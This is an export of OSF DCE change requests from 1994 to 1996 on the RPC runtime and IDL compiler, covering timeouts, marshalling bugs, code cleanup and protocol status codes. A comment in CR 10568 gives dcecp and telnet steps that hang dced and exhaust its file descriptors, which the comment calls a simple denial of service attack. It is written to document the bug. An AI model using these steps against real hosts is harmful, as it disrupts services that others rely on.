1994-10-01-08:35:42.506-04:00I----- dtsd ERROR dts dtsdate time_request.c 689 0x
401b7678 RPC call ClerkRequstTime() to remote server failed: Communications fail
ure (dce / rpc)
1994-10-01-12:36:53.965-04:00I----- dtsd ERROR dts dtsdate time_request.c 689 0x
401b7678 RPC call ClerkRequstTime() to remote server failed: Communications fail
ure (dce / rpc)
1994-10-01-14:37:28.361-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7affa020 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)
1994-10-01-22:41:05.461-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7affa020 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)
1994-10-02-06:46:59.418-04:00I----- dtsd ERROR dts dtsdate time_request.c 689 0x
401b7678 RPC call ClerkRequstTime() to remote server failed: Communications fail
ure (dce / rpc)
1994-10-02-06:47:06.298-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7affa020 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)
1994-10-02-16:54:07.699-04:00I----- dtsd ERROR dts dtsdate time_request.c 689 0x
401b7678 RPC call ClerkRequstTime() to remote server failed: Communications fail
ure (dce / rpc)
1994-10-02-17:01:22.176-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7affa020 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)

ie. lots! Lots of warnings and dfs comm failures w/ auth helper catatonic
messages too ... along with Time provider timeout detected messages.

Dropping to a 1 since there doesn't seem to be much you can do with this
information before the bit freeze. I am interested in the DG vs. CN results
so if you get a chance to update this CR with them, please do - thanks.

[2/5/96 public]

The last entry is more than a year old. Is there any new info available?

[2/5/96 public]
Wow, dejavu all over again :-).
We know this type of error is not still happening as described above on HPUX
and OSF/1 is no longer a reference platform.  If it were happening in 1.2.1,
(on AIX or HPUX) I'm sure they would've opened an OT for it, not realizing
that this was even here.  Given that the above people reporting failures
are no longer at the OSF, and I know I haven't seen what I mentioned above
in the last year, I'd say close this.

[2/5/96 public]
Reunion time :-)
I've removed the obsolete email addresses from the above and replaced them
with their new email addresses, to see if anybody remembers any more about
this ;^)

[2/6/96 public]
Ok, here's the comments from the original participants:

arbo> I say keep it open.  I'm not convinced it's gone yet .  You *might*
arbo> be able to convince me to lower the priority :^>.

mckeen> Well, I was just thinking a week or so ago that I hadn't seen this bug
mckeen> for over a year and that it probably could be closed as unreproducable.
mckeen> But hey, maybe you should just assign it to one of the OSF engineers
mckeen> and have them take a look at it.......

gmd> Yup - dfs bugs never die - don't you just miss those days?

But, seriously.  There's no longer any info above to go further on, and the
one final insight we did have (actually Tom had), where he discovered that
DG had unexplained timeouts, matches up with a problem we saw here at HP
during our 1.1 productiazation work with DG timeouts that has since gone away.

Seiichi, if you believe this is the same DG timeout problem that you already
fixed, then close this with a reference to what you fixed.  If not, and the
above doesn't provide any useful information anymore since it's not happening
with any current builds, then I'd suggest that you cancel it as unreproducable.



CR Number                     : 12283
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : performance issue with RPC IDL compiler
Reported Date                 : 9/21/94
Found in Baseline             : 1.0.3
Found Date                    : 9/21/94
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/21/94 public]
<blank lines are filled with a single '.' -- our problem>
.
We have been experiencing performance problems with 1.0.3 IDL.  We
created tests that consist of two parts, a simple server that
accepts and immediately returns from RPCs, and a simple client to
exercise the server with different types of RPCs.  The test is
configured so that it saturates the CPU.  We can provide these test
cases if required but this report is intended to raise general
concerns with 1.0.3 RPC performance.
.
In the case of plain RPC's with 0, 1K, 2K, 4K and 8K bytes of data
1.0.3 performed the same or slightly better.  In the case showqn
below (marshalling a very complicated structure) the 1.0.3
performance is much worse.  The summary appears to be that the 
1.0.3 RPC transport or marshalling of very simple data types
performance is equal or better than 1.0.2 but there is a big hit
in marshalling complicated data structures.
.
The initial results of running the test generated the following
results:
.
        Client  Server  ms/RPC
.
        1.0.2a  1.0.2a     9.3
.
        1.0.2a  1.0.3     14.3
.
        1.0.3   1.0.2a    14.3
.
        1.0.3   1.0.3     19.5
.
Transarc then discovered that there was DCE 1.1 fix for IDL
performance (OT defect 10103) that Tom Jordahl pointed us toward.
We applied this to our 1.0.3 base and reran the tests.  The
performance improved but was still worse that 1.0.2.
.
        Client  Server  ms/RPC
.
	1.0.3+ 1.0.3+	  14.3
.
These results were obtained with client and server running a
Sparc 4/75 with SunOS 4.1.3.

[9/21/94 public]
There is no further work scheduled to be done to the idl compiler for R1.1.
We are only a few days away from bit freeze.

There is also no mandate to match 1.0.2 idl performance in all cases.
And I guess the performance numbers for the 'new' idl is old news,
and some of the problems are well understood by those who have
studied it (HP, DEC).  Much of the penalty can be attributed to
the reason for the stub changes in idl: the stub code is much
smaller because it does not inline the marshalling routines, rather
it calls in to libdce (the library calls will be slower).

If you can provide OSF (or perhaps DEC for 1.2) with specific changes
that help on your platforms, the likelyhood of this getting addressed
will increase.

Lowering to a P3, and setting fixby to 1.2.



CR Number                     : 12250
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : es
Short Description             : with no encoding check multiple params botched
Reported Date                 : 9/19/94
Found in Baseline             : 1.1b16
Found Date                    : 9/19/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/19/94 public]
When using no encoding check [ idl_es_set_attrs(eh,
IDL_ES_NO_ENCODING_CHECK, st)], and an idl-generated decoding
function that takes multiple params (eg, a data struct and a status),
The 2nd param may get a bad value stuffed into it.

I found this with dce_db_header_fetch(), which retrieves
the first part of a backing store entry:

IDL file:
    void dce_db_header_convert(
	[in]        handle_t                h,
	[in,out]    dce_db_header_t         *data,
	[out]       error_status_t          *st );

ACF file:
    [decode]  dce_db_header_convert([comm_status] st);

C code:
    ep    = (idl_byte *)content.data;
    esize = (idl_ulong_int)content.size;
    idl_es_decode_buffer(ep, esize, &eh, st);
    if (*st != error_status_ok) return;
    idl_es_set_attrs(eh, IDL_ES_NO_ENCODING_CHECK, st);
    dce_db_header_convert(eh, (void *)hdr, st);

The value that is after the "header" was stuffed into "st". 
This is from a mail message sent this week:

    dce_db_header_convert() calls rpc_ss_ndr_unmar_interp() [file is
    rpc/idl/lib/bdrui.c].  This knows that there are 2 params ("hdr" and
    "st") and has a ptr to the thing to decode.  Say that buffer is 100
    bytes and the header is 30.  When it's done doing the header (it knows
    that it's done with that first param), the pointer into the buffer is
    after the header and at the start of the object's "real" data.  It
    happily decodes the next thing into the 2nd parm.  I don't think it's
    decoding the entire object into the (smaller) header because the value
    that gets stuffed into "st" is the first value of the "real" data (in
    my 2 test cases, a u32).

(My workaround for 1.1 was to not pass the status, but use TRY/CATCH.)



CR Number                     : 12246
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : 
Short Description             : OSDqa09175 unused functions can be removed
Reported Date                 : 09/19/94
Found in Baseline             : 1.1
Found Date                    : 09/06/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[09/19/94 public]
Full Description:

Related-file:::: Problem
 DESCRIPTION:

 Our compiler pointed out the following unused code fragments in rpc/runtime:


 cnsasgsm.c : server_assoc_count_pred_rtn (replaced by macro)

 cnsassm.c : active_pred_rtn (simply unused)

 cnsclsm.c : (the following appear replaced by macros)
 		disconnected_maybe_pred_rtn,
 		disc_last_send_pred_rtn,
 		request_fault_pred_rtn,
 		response_fault_pred_rtn,
 		last_recv_frag_pred_rtn,
 		first_frag_pred_rtn



CR Number                     : 12245
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : 
Short Description             : OSDqa09172 call to malloc() should be cast
Reported Date                 : 09/19/94
Found in Baseline             : 1.1
Found Date                    : 09/06/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rpc/runtime/rpcsvc.c
Sensitivity                   : public

[09/19/94 public]
Full Description:

Related-file:::: Problem
 DESCRIPTION:

 In rpcsvc.c, the call to malloc() should be cast.


Related-file::Added 940906 by ddts:: /build/hiosfm/RCS/dce1.1/src/rpc/runtime/./rpcsvc.c,v 7.2
 /build/hiosfm/RCS/dce1.1/src/rpc/runtime/./rpcsvc.c,v 7.2
 rusman 1994/09/06 13:52:12 +6 -3
 Reason:  OSDqa09172 (new bug)
 call to malloc() should be cast

     *** /tmp/ci.22078..rpcsvc.c.22112.1	Tue Sep  6 09:52:15 1994
     --- /tmp/rpcsvc.c.22112.2	Tue Sep  6 09:52:15 1994
     ***************
     *** 136,147 ****
            * calls RPC_DBG_PRINTF) preclude an implementation using a
            * mutex to protect a static buffer.  The potential for infinite
            * recursion precludes allocating memory using internal RPC
            * interfaces, since those interfaces call RPC_DBG_PRINTF.
            */
     !
           if( (bptr = malloc(RPC__SVC_DBG_MSG_SZ*sizeof(char))) == NULL )
           {
       	/* die horribly */
       	abort();
           }

     --- 136,150 ----
            * calls RPC_DBG_PRINTF) preclude an implementation using a
            * mutex to protect a static buffer.  The potential for infinite
            * recursion precludes allocating memory using internal RPC
            * interfaces, since those interfaces call RPC_DBG_PRINTF.
            */
     ! #ifdef hitm
     !     if( (bptr = (char *)malloc(RPC__SVC_DBG_MSG_SZ*sizeof(char))) == NULL )
     ! #else
           if( (bptr = malloc(RPC__SVC_DBG_MSG_SZ*sizeof(char))) == NULL )
     + #endif
           {
       	/* die horribly */
       	abort();
           }

[09/19/94 public]
This is wrong.  If malloc is properly declared it should NEVER have to
be cast.  Perhaps it's not properly declared?

[9/19/94 public]
While I'm thrilled to get a CR from the beta program, this one is bad for
a few more reasons.  First, if the cast was good (and it's not), this fix
says: 

  #ifdef <mymachine>
    do the right thing
  #else
    do the wrong thing
  #endif 

Second, it adds an #ifdef for a machine dependency and we don't want those,
particularly for non-reference platforms.

Tom: I say cancel.

[levy 9/19/94 public] 

A small comment: unlike other defects reported by DCE support customers,
DCE beta defects are "automatically" entered into OT. In particular, there
is none of the "regular" syseng filtering. I am quite sure (knowing the
submitter of this problem) that the conditional compilation trick used here
is just meant as a temporary annotation awaiting the "official" OSF fix.
Furthermore, while Rich points out that a properly declared malloc never
requires casting, rpcsvc.c never includes stdlib.h...

Tom: I say #include <stdlib.h>   :)



CR Number                     : 12243
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : 
Short Description             : OSDqa09169 type mismatch in subroutine call
Reported Date                 : 09/19/94
Found in Baseline             : 1.1
Found Date                    : 09/06/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rpc/idl_compiler/errors.c
Sensitivity                   : public

[09/19/94 public]
Full Description:

Related-file:::: Problem
 DESCRIPTION:

 In the 2nd Beta drop for DCE1.1:

 in idl/idl_compiler/errors.c, the call to log_error() contains a parameter
 of incorrect type. "text_len" is an integer, and the calling interface
 requires a char * .



Related-file::Added 940906 by ddts:: /build/hiosfm/RCS/dce1.1/src/rpc/idl/idl_compiler/./errors.c,v 7.2
 /build/hiosfm/RCS/dce1.1/src/rpc/idl/idl_compiler/./errors.c,v 7.2
 rusman 1994/09/06 12:57:21 +10 -3
 Reason:  OSDqa09169 (new bug)
 type mismatch in call to log_error()

     *** /tmp/ci.21256..errors.c.21290.1	Tue Sep  6 08:57:23 1994
     --- /tmp/errors.c.21290.2	Tue Sep  6 08:57:24 1994
     ***************
     *** 154,163 ****
     --- 154,166 ----
       #endif

       {
           boolean have_text = false;  /* True if have source text to output */
           int     text_len = 0;       /* Length of source text to output */
     + #ifdef hitm
     +     char    text_len_string[4];
     + #endif
           int     lineno;             /* Source line number of relevant text */
           long    msg_id;             /* ID of message to output */
           char    *near_text;         /* Text of object near error */
           STRTAB_str_t string_id;     /* Entry in string table of near text */

     ***************
     *** 197,208 ****
               if (feof(*yyin_p))
                   msg_id = NIDL_EOF;
               else
                   msg_id = NIDL_SYNTAXNEAR;
           }
     !
           log_error(lineno, msg_id, text_len, near_text);
       }
       
       /*
        *  y y e r r o r
        *
     --- 200,215 ----
               if (feof(*yyin_p))
                   msg_id = NIDL_EOF;
               else
                   msg_id = NIDL_SYNTAXNEAR;
           }
     ! #ifdef hitm
     !     sscanf(text_len_string,"%d",&text_len);
     !     log_error(lineno, msg_id, text_len_string, near_text);
     ! #else
           log_error(lineno, msg_id, text_len, near_text);
     + #endif
       }
       
       /*
        *  y y e r r o r
        *



CR Number                     : 11864
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : rpccp
Short Description             : rpccp show group -m and -r problem
Reported Date                 : 8/24/94
Found in Baseline             : 1.0.3
Found Date                    : 8/24/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/24/94 public]


"rpccp show group" can take -m for a specific member name. it can also take
"-r [level]" for recursive search. One could expect the two options to work
together. Not!

If the membername is not in the first level, no more recursive search will
happen. If the first level search succeeds, then if the member is an entry, it
stops there, no more recursive search; if the member is a group, it will
search the elements of the group, with the search member as itself. So it will
not succeed unless it is also has itself as a member. Then bad things happen of
course since no loop detection is implemented here.

So it seems to me that the original designer for show group never meant for -m
and -r to work together.  Otherwise the code is broken.



CR Number                     : 11484
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 7294, 34
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : idl/lib/upkibml.c
Short Description             : Fix of CR 7294 should be backed out
Reported Date                 : 7/29/94
Found in Baseline             : 1.1
Found Date                    : 7/29/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 1.1maint
Affected File(s)              : 
Sensitivity                   : public

[7/29/94 public]

Customer reported:

"CR 7294 reserves the word order in order to pass VTS. But actually the VTS
is wrong (See VTS CR 34), in the file vta_ndr.h
in the VTS.   The IEEE double floating point representation for
1.1 and 4.0 are word reversed from IBM double floating point
representation for the same numbers.  This is why it seemed
that the words were comming back reversed from the runtime.
The actual bug fix is to reverse the IBM doubles into the
same word order as the IEEE for 1.1 and 4.0.   I really
believe that the fix in the runtime for CR# 7294 is wrong.
IEEE big endian and IBM big endian are in the same word order.
This fix has been applied to DCE 1.1 and should be removed.
The following is the defines in vta_ndr.h that are reversed
from each other.

#define IEEE_D_VALUE1_L         (0X9999999a)    /* 1.1 */
#define IEEE_D_VALUE1_H         (0X3ff19999)    /* 1.1 */
#define IEEE_D_VALUE2_L         (0X00000000)    /*  4.0 */
#define IEEE_D_VALUE2_H         (0X40100000)    /*  4.0 */

#define IBM_D_VALUE1_L          (0X41119999)    /* 1.1 */
#define IBM_D_VALUE1_H          (0X9999999a)    /* 1.1 */
#define IBM_D_VALUE2_L          (0X41400000)    /*  4.0 */
#define IBM_D_VALUE2_H          (0X00000000)    /*  4.0 */



The fix is to reverse these:

#define IBM_D_VALUE1_L          (0X9999999a)    /* 1.1 */
#define IBM_D_VALUE1_H          (0X41119999)    /* 1.1 */
#define IBM_D_VALUE2_L          (0X00000000)    /*  4.0 */
#define IBM_D_VALUE2_H          (0X41400000)    /*  4.0 */


I thought previously that there was a problem in pbi_ndr.c
in the VTS source.  The reason I thought that was because we
are IBM big endian and our testing was using the IBM_D_VALUE's
which were reversed."

So when VTS 34 is fixed, the fix to upkibml.c should be backed out.

To be more specific, the following fix should be removed from upkibml.c:

*** upkibml.c.orig      Tue Jul 12 18:57:26 1994
--- upkibml.c   Wed Jul 27 14:26:02 1994
***************
*** 100,114 ****
  #if (NDR_LOCAL_INT_REP == ndr_c_int_big_endian)
  
          memcpy(&r[1], input_value, 8);
- #if (defined(_IBMR2) && defined(_AIX)) || \
-     (defined(__hppa) && defined(__hpux))
-         {
-         idl_ulong_int tmp;
-         tmp = r[1];
-         r[1] = r[2];
-         r[2] = tmp;
-         }
- #endif
  
  #else
        memcpy(r, input_value, 8);
--- 100,105 ----



upkibml.c.orig is the file that came with DCE1.1.

[7/29/94 public]
Assigned to the only VTS person we have left

[8/12/94 public]
I tried running the VTS big-endian tests with the suggested fix
and the old rpc/idl/lib/upkibml.c (ie, backing from the currrent fix) - still 
the VTS tests fail - might be some additonal fixes are needed to VTS,
which were not mentioned above.

It is true that VTS was not using the correct IBM big endian values,
as explained by the customer [see RPC AES].

There was a request to IBM (gerry thomes) to execute big-endian (double)
tests [NOT vts tests] between MVS and AIX. At present, waiting for
their input to take an action on this OT.

[9/14/95 public]

Backed out the fix to upkibml.c as described above.  Applied the VTS fix to
VTS 1.0.2 and ran protocol tests above.  Success.



CR Number                     : 11145
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : test
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : 
Short Description             : cover_ool test fails because of call thread stack size.
Reported Date                 : 6/30/94
Found in Baseline             : 1.0.3
Found Date                    : 6/30/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/30/94 public]

In cover_ool.idl the ARRAY_SIZE is too large for some platform default
thread stack. This is a porting problem (the test runs fine on the
reference platforms) but it would nice to have provision in the common
server for setting the call threads stack size with
rpc_mgmt_set_server_stack_size.



CR Number                     : 10746
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : uuid_from_string
Short Description             : uuid_from_string fails to reject
a uuid string with a non-hexadecimal final character
Reported Date                 : 5/24/94
Found in Baseline             : 1.1
Found Date                    : 5/24/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : .../src/rpc/runtime/uuid.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/24/94 public]

 The routine uuid_from_string() can accept an invalid string as a valid
uuid. That is, a string the last character of which is not hexadecimal.
This is because of the peculiar behaviour of sscanf (and the DCE routine
uuid__sscanf) which stop parsing a "%x" format when they reach a
non-hexadecimal character. If the first character of the last uuid field
(which is two characters) is hexadecimal, and the second is not, scanf will
react just as if both characters were hexadecimal.

[8/15/94 public]
So I don't see anyway we can fix this without going through a great
deal of trouble.  Perhaps this is a bug in scanf().
Not going to get fixed.
Canceled.

[8/15/94 public]
Doesn't mean it still isn't a bug though.  Changed to defer, perhaps in the
future someone will have time to fix this.



CR Number                     : 10568
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 8224
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : CN needs watchdog timeout on association opens
Reported Date                 : 5/6/94
Found in Baseline             : 1.0.3
Found Date                    : 5/6/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cnassoc.c cnrcvr.c
Sensitivity                   : public

[5/6/94 public]
Too many times we've seen the case where a CN RPC call hangs up a client
because the server was hung up and never responded to the initial negotiation
packet that the client sent.  We've also seen hangs where the client mistakenly
connected to a non-DCE socket.

The CN watchdog timer event, which already looks for associations to reap, 
should also keep watch over attempts to set up a new association, and abort
it if nothing has happened for some long period, like a minute.

[05/06/94 public]
It may be dangerous to timeout a connection like this, on slow networks
or machines.  I have no idea how you manage to get a client to
connect to a non-DCE socket, I know there is/was a defect on this in
the database.

[5/6/94 public]
TCP already does the 75-second timeout on getting a connection.  The problem
is if the endpoint map has an old entry for the server you're looking for, and
some other non-DCE program is listening on that socket now, then the client
will be able to get connected, will send the opening salvo of syntax 
negotiation, but if the non-DCE server is doing a read looking for a linefeed,
it's going to silently absorb the client's request and keep waiting for that
linefeed (since the syntax negotiation doesn't contain 0x0a).  And the client
is going to wait for the syntax negotiation response.

Forever.

[8/19/94 public]
This seems like a reasonable enhancement, 
but of course it is out of the 1.1 scope.

I belive that with dced in 1.1, the endpoint management should be more robust. 
Work has been done on the core services so they remove their endpoints
from the ep map on shutdown.  This should help with stale endpoint problems.
And of course, any well behaved application should also remove its
endpoints when it shuts down.

Since problems described above generally happen when things go wrong
(servers hanging, servers no unregistering endpoints),
perhaps this can be done if/when there is a DCE robustness project.

[2/2/96 public]

This bug has a quite interesting impact on dced. Consider a server which
does the following typical initializaiton:

  rpc_server_use_all_protseqs(...);
  rpc_server_inq_bindings(...);
  rpc_server_register_if(...);
  rpc_ep_register(...);

then never call rpc_server_listen(). (It could be busy, doing something
else.) Since the TCP/IP listening port is open, when ep_ping1 thread in
dced pings it the call hangs. This means no more cleanup of stale
endpoints. Also, because this blocking rpc is creating a new association
group, it holds grp_new_mutex and prevents other threads opening a new
association. If maintain_machine_context and/or keymgmt_handler threads try
to talk to secd over CN, it gets blocked and the host's TGT will expire.
You can try: (The port 23 is the telnet port.)

  dcecp -c account modify hosts/foo/self -maxtktlife +0-00:10:00
  dcecp -c endpoint create -i `uuidgen`,0.0 -b '{ncacn_ip_tcp:[23]}'

Another hangup can be caused by a non rpc client connecting to a server.
Run a lot of "telnet foo 135". At some point, dced's open file descriptor
table becomes full and can't make/accept any CN rpc. (DG still works,
though.) And of course, if it can't open a file, then it can't update a
credential file. A simple denial of service attack.

By the way, rpc__cn_assoc_timer_reclaim() can't be used to watch these
events because in both cases a new association hasn't been added to a
association group.



CR Number                     : 10333
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : dg
Short Description             : enhanced dg support for auto-started servers
Reported Date                 : 4/12/94
Found in Baseline             : 1.1b6
Found Date                    : 4/12/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/12/94 public]

It would be nice to enhance the RPC DG code to better support auto-started
servers.  In particular, while dced is waiting for a server to start the
client could time-out and give up.  Mark Karuzis noted that we could take
advantage of the current RPC DG implementation by having dced return a
nocall packet with a boot-time of 0 and add new semantics to this that mean
"binding in progress."  Pre-1.0.3 clients will see the nocall and eventually
time-out.  1.0.3 clients will see the packet, NOT timeout, and NOT update
their binding handle.  1.1 clients will see the backet, note the call is
being routed, and not update the binding.

In other words, it seems to be the right thing for 1.0.3 and later,
and pre-1.0.3 clients will timeout which is not the wrong thing.



CR Number                     : 10266
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 7293
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : obscure authentication failure status.
Reported Date                 : 3/31/94
Found in Baseline             : 1.0.3
Found Date                    : 3/31/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/31/94 public]

Here is 1) an instance of a obscure error status returned by the runtime 2)
an instance where the error status reported by the runtime depends on the
protocol. Isn't RPC supposed to present to the programmer an abstraction
independent of protocols (see discussion in 7293)?

1) If a service ticket held by a client was derived using a key no longer
available to the server (say an administrator inadvertently deleted an old
version of the server key from the keytab file) an authenticated rpc from
that client will fail with status rpc_s_unknown_reject over ncacn_ip_tcp
and rpc_s_comm_failure over ncadg_ip_udp. Neither status is helpful.
Actually I had a hard time tracking down a CDS problem because of the lack
of information conveyed by the rpc status in this situation. Isn't the
"right" thing to do to have the runtime return the same HELPFUL status in
this situation (e.g.  rpc_s_auth_bad_integrity or a catchall status for
authentication problems)?

2) rpc_mgmt_is_server_listening returns rpc_s_server_too_busy over
ncacn_ip_tcp and rpc_s_comm_failure over ncadg_ip_udp when the call queue
is full. The rpc_s_server_too_busy status is certainly useful and accurate.
Isn't the "right" thing to do to have ncadg_ip_udp return that same status?

[7/8/94 public]

In the above case 1), DG now returns rpc_s_who_are_you_failed instead of
rpc_s_comm_failure, which was fixed in CR 10444.

[8/26/94 public]

In the above case 2), the DG server runtime simply drops the request
packet. This has some advantage over CN if the call queue full status is
transient because the automatic re-xmit of the request by the client
runtime may succeed. (In CN, the client application itself must retry or
find another server.) If we are going to retain this advantage, it's
difficult to decide when we return the rpc_s_server_too_busy status.
(Probably, the only way to implement this is the use of the packet's serial
number.)

[2/7/96 public]

Making this enhancement request.



CR Number                     : 10218
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : add support for dynamic thread pools
Reported Date                 : 3/23/94
Found in Baseline             : 1.1
Found Date                    : 3/23/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/23/94 public]

The thread pool facility should provide a way to dynamically 
allocate server call threads to meet occasional peak needs.

As an example of when this functionality would be useful, consider the
auto-start capability of the dced:  It's now possible that each
resolve-endpoint call made by a client could result in the spawning of
a server process.  This new server process will need an indeterminate
amount of time to initialize itself before delivering its endpoints
to the dced, which then completes the original resolve-endpoint call.

While waiting for the endpoints, one of the dced's call threads is being
tied up.  In the worst case, all of the call threads are waiting for
servers to start-up, and all of the spawned servers are blocked waiting
for the results of RPCs that *they've* made as part of *their*
initialization; in this case, the CPU is idle, but new calls to the dced
can't be started.

Note that this problem is not isolated to the dced. 

One way to avoid this is for the server to call rpc_server_listen() with
max_calls set to the largest number of concurrent requests it expects to
see.   There are two problems with this approach.  First, in most cases
there's no way to determine what the right number is.  And second, in the
case where the server never actually needs the extra threads (which may
be most of the time) it shouldn't have to pay for them.

A more reasonable solution would be to allow the server to create the
normal default pool (which caches a moderate number of live threads),
*and* a dynamic thread pool that can expand if necessary.

The new (private) API call would look something like this:

/*
 * R P C _ S E R V E R _ C R E A T E _ D T H R E A D _ P O O L
 *
 * Create a dynamic pool initially containing "min_threads" threads to
 * execute incoming RPC requests.  If calls are targeted to this pool,
 * and all threads are in use, new threads will be created, up to a
 * maximum of "max_threads".
 *
 * Specifying a max_threads value of 0 indicates that the thread pool
 * has no upper bound (and should be used with caution).
 *
 * Return a handle onto that pool. The pool exists until the pool is
 * freed; the pool's initial threads are created when rpc_server_listen()
 * is called, and all of its threads are destroyed when rpc_server_listen()
 * returns.
 */
void rpc_server_create_dthread_pool
(
    [in]        unsigned32              min_threads,
    [in]        unsigned32              max_threads,
    [out]       rpc_thread_pool_handle_t *phandle,
    [out]       unsigned32              *status
);


Note that this functionality is specifically *not* intended as a general
deadlock prevention mechanism.  It would be a bad idea for developers to rely
solely on the dynamic creation of resources to avoid deadlock scenarios.



CR Number                     : 9970
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : variadic functions should use ANSI stdarg facility
Reported Date                 : 2/16/94
Found in Baseline             : 1.1
Found Date                    : 2/16/94
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : see below
Sensitivity                   : public

[2/16/94 public]

There are several places in the IDL compiler (errors.h/errors.c is on
example) where functions taking a varying number of arguments are declared
using the old "printf" style of argumentlist (arg1, arg2, arg3, etc.).
These functions are declared with no prototype (e.g. using the pre-ANSI 
function declaration ... void error_print()).

In order to meet the spirit of code cleanup guidelines for DCE 1.1, 
all such functions should be re-written to use the mechanisms defined via
stdarg.h, and prototypes for these functions should be supplied.



CR Number                     : 9964
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : switch statements don't catch all cases
Reported Date                 : 2/16/94
Found in Baseline             : 1.1
Found Date                    : 2/16/94
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : see below
Sensitivity                   : public

[2/16/94 public]

